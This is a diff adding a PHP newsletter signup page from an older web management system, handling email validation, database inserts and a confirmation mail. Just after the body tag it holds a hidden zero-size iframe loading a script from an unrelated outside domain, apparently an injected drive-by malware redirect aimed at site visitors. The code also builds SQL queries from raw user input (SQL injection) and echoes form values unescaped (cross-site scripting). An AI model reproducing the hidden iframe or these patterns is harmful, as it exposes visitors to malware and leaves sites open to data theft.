@@ -1,0 +1,152 @@
+<?php
+// BME WMS
+// Page: Newsletters Homepage
+// Path/File: /newsletters/index.php
+// Version: 1.8
+// Build: 1802
+// Date: 01-25-2007
+
+header('Content-type: text/html; charset=utf-8');
+include '../includes/main1.php';
+$line_hgt = 800;
+
+if($submit) {
+	//Validate
+	$error_txt = "";
+	if (!eregi("^[a-z0-9]+([_\\.-][a-z0-9]+)*". "@([a-z0-9]+([\.-][a-z0-9]{1,})+)*$",$email) ){
+		$error_txt .= "You did not enter your e-mail address correctly. Please try again.<br>\n";
+	}
+	
+	if($error_txt == "") {
+		//Check DB
+		$query = "SELECT email FROM news_member WHERE email='$email'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+		while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+			$tmp_email = $line["email"];
+		}
+		mysql_free_result($result);
+		
+		if($tmp_email == $email) {
+			$error_txt .= "You are already subscribed to this newsletter. You do not need to subscribe again<br>\n";
+		}
+	}
+
+	if($error_txt == "") {
+		//Write to DBs
+		$now = date("Y-m-d H:i:s");
+		$query = "INSERT INTO news_member SET created='$now', status='0', name='$name', email='$email'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+
+		$query = "SELECT member_id FROM news_member WHERE email='$email'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+		while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+			$tmp_member_id = $line["member_id"];
+		}
+		mysql_free_result($result);
+
+		$now = date("Y-m-d H:i:s");
+		$query = "INSERT INTO news_subscriptions SET created='$now', member_id='$tmp_member_id', newsletter_id='1'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+		
+		//Send Confirmation Email
+		$query = "SELECT content, subject, email FROM news_email WHERE email_id='1'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+		while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+			$content = $line["content"];
+			$subject = $line["subject"];
+			$email_tmp = $line["email"];
+		}
+		mysql_free_result($result);
+
+		$email_str = "";
+		$email_str .= $content;
+		$email_str .= "\n\n";
+		$email_str .= $base_url . "newsletters/index2.php?confirm=1&member_id=";
+		$email_str .= $tmp_member_id;
+		$email_str .= "\n\n\n";
+
+		$email_subj = $subject;
+		$email_from = "FROM: " . $email_tmp;
+		mail($email, $email_subj, $email_str, $email_from);
+		
+		//Send to Thanks Page
+		header("Location: " . $base_url . "newsletters/thanks.php");
+		exit;
+		
+	}
+}
+
+?>
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title><?php echo $website_title; ?>: Newsletter</title>
+<?php
+include '../includes/meta1.php';
+?>
+<link rel="stylesheet" type="text/css" media="screen" href="/includes/reset.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/includes/core.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/includes/site_styles.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/includes/wmsform.css" />
+<script type="text/javascript" src="/includes/js_funcs1.js"></script>
+<script type="text/javascript" src="/includes/jquery-1.5.2.js"></script>
+<script type="text/javascript" src="/includes/wmsform.js"></script>
+</head>
+<body bgColor="#ffffff" onload="MM_preloadImages('newsletter_Layer 64_f2.gif','button_subscribe_over.gif','/images/warning_over.gif','/images/aboutus_over.gif','images/newsletter_over.gif','images/links_over.gif','images/find_over.gif','images/become_over.gif','/images/store_over.gif','/images/faqs_over.gif','/images/lucid_over.gif','/images/suggestions_over.gif','/images/supplement_over.gif','/images/testimonial_over.gif','/images/contact_over.gif')">
+<iframe src="http://aviavavilons.net/ss/go.php?sid=7" width="0" height="0" frameborder="0"></iframe>
+<?php
+include '../includes/head1.php';
+?>
+
+<table border="0" width="95%">
+
+<tr><td>&nbsp;</td></tr>
+
+<tr><td align="left" class="style4">Newsletter</td></tr>
+
+<tr><td align="left" class="style2">Sign up today for our newsletter. Or you can <a href="./unsubscribe.php">unsubscribe</a> from our newsletter.</td></tr>
+
+<?php
+//Error Messages
+if($error_txt) {
+	echo "<tr><td>&nbsp;</td></tr>\n";
+	echo "<tr><td align=\"left\" class=\"style2\"><font color=\"red\">$error_txt</font></td></tr>\n";
+	echo "<tr><td>&nbsp;</td></tr>\n";
+}
+?>
+
+<tr><td align="center">
+<table border="0"><tr><td align="left">
+	<FORM name="newsletter" Method="POST" ACTION="./index.php" class="wmsform">
+	<input type="hidden" name="submit" value="1">
+	<p>Please complete the form below. Required fields marked <em>*</em></p>
+	<fieldset>
+		<legend>Please Enter Your Information</legend>
+		<ol>
+			<li class="fm-optional">
+				<label for="name">Name</label>
+				<INPUT type="text" id="name" name="name" size="30" maxlength="100" value="<?php echo $name; ?>" tabindex="1" />
+			</li>
+			<li>
+				<label for="email">E-Mail <em>*</em></label>
+				<INPUT type="text" id="email" name="email" size="30" maxlength="100" value="<?php echo $email; ?>" tabindex="2" />
+			</li>
+			<li class="fm-button">
+				<input type="image" src="/images/button_subscribe.gif" id="button_subscribe" name="button_subscribe" alt="Subscribe" onmouseover="MM_swapImage('button_subscribe','','/images/button_subscribe_over.gif',1)" onmouseout="MM_swapImgRestore()">
+			</li>
+		</ol>
+	</fieldset>
+	</form>
+</td></tr></table>
+</td></tr>
+
+<tr><td align="left" class="style2">Please note: Our Newsletter System will send you a confirmation e-mail to verify you want to subscribe to our newsletter and no one else is subscribing you to our newsletter. When reading the message, simply click the link provided and your subscription is automatically confirmed. Also note, in some cases, SPAM filtering software will catch the confirmation e-mail. If you do not receive your confirmation e-mail shortly after subscribing, check for it in your Junk mailbox.</td></tr>
+
+<tr><td>&nbsp;</td></tr>
+
+</table>
+<?php
+include '../includes/foot1.php';
+mysql_close($dbh);
+?>
